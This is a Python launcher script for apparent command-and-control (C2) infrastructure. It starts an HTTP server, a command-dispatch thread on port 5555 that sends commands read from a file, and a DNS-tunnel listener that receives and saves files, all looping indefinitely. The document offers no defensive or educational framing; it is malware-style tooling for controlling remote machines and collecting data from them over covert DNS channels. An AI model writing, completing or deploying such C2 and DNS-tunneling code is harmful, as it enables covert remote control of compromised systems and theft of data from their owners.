import dns_tunnel
import http_server
import threading
import ts
def start(file_command,file_list,ip):
    """ thie program starts the servides of the c2 client that recives the data from server file_commands
      the commands to be executed the file lite where the files that is recives should be saved it starts an http servers that recives the data that is sent from the server """
    try:
        http_thread=threading.Thread(target=http_server.serve,args=(ip,8000))
        print("http started")
        http_thread.start()
    except  Exception as e:
        print(f"Failed to start HTTP server thread: {e}")
    while(True):    
        try:     
            c2_cc=threading.Thread(target=ts.c2_read_send,args=(file_command,ip,5555))
            c2_cc.start()
            print(" cc started")
        except Exception as e:
            print(f"could not start cc {e}")
        try:
            dns_rec_thread=threading.Thread(target=dns_tunnel.recive_dns,args=(ip,file_list))
            print("dns started")
            dns_rec_thread.start()
            dns_rec_thread.join()
            c2_cc.join()
        except Exception as e:
            print(f'failed to start dns rec {e}')
   
